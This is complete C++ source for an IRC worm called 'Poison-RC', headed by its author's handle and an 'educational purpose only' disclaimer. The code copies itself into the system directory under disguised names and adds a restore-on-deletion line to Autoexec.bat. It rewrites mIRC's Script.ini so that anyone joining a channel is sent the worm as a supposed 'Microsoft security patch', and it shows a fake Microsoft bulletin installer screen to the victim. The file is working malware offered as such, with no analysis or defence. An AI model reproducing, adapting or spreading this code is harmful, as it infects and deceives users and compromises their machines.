   //Poison-RC: IRC worm coded by aLL3GrO
   //W32.Poison-RC.Worm, IRC.Poison-RC.Worm
   //Simple mIRC propagating worm with Anti-Deletion routine
   //For educational purpose only. DO NOT RELEASE

   #include <iostream.h>
   #include <stdio.h>
   #include <windows.h>
   #include <dir.h>
   #include <string.h>

   struct ffblk ffblk;
   int re;
   FILE *s,*start;
   char SysDir[50]={" "};
   char dcc[100]={" "};

   void Infect(char pt[50], char source[70]) {
     char bak[100]={" "};
     char del[100]={" "};
     GetSystemDirectory(SysDir,sizeof(SysDir));
     strcpy(bak,SysDir);
     strcat(SysDir,"\\q160301.exe");
     strcat(bak,"\\krnl.dll");
     CopyFile(source,SysDir,FALSE);
     CopyFile(source,bak,FALSE);
     start=fopen("c:\\Autoexec.bat","a");
     fprintf(start,"@echo off\n");
     strcpy(del,"@if not exist ");
     strcat(del,SysDir);
     strcat(del," copy ");
     strcat(del,bak);
     strcat(del," ");
     strcat(del,SysDir);
     strcat(del,"\n");
     fprintf(start,del);
     fprintf(start,"@cls");
     fclose(start);
     strcat(pt,"Script.ini");
     s=fopen(pt,"w");
     fprintf(s,"[Script]\n");
     fprintf(s,"n0=on 1:join:#:if $me != $nick .msg $nick Here is the latest security patch from Microsoft\n");
     strcpy(dcc,"n1=on 1:join:#:if $me != $nick .dcc send $nick ");
     strcat(dcc,SysDir);
     fprintf(s, dcc);
     fclose(s);
   }

   void main(int argc, char *argv[]) {
     char any;
     re=findfirst("c:\\mirc\\mirc32.exe",&ffblk,0);
     if(re==0) {
       Infect("c:\\mirc\\",argv[0]);
     }
     re=findfirst("c:\\mirc32\\mirc32.exe",&ffblk,0);
     if(re==0) {
       Infect("c:\\mirc32\\",argv[0]);
     }
     re=findfirst("c:\\irc\\mirc32.exe",&ffblk,0);
     if(re==0) {
       Infect("c:\\irc\\",argv[0]);
     }
     re=findfirst("c:\\chat\\mirc32.exe",&ffblk,0);
     if(re==0) {
       Infect("c:\\chat\\",argv[0]);
     }
     cout << "Microsoft Security Bulletin q160301 - IE5 ""Toushey"" Vulnerability Patch" << endl;
     cout << "Copyright (C) 2001 Microsoft Corp. All Rights Reserved" << endl;
     cout << endl;
     cout << "Press ""P"" and then Enter to install patch....";
     cin >> any;
     cout << "Patch successful !";

   }
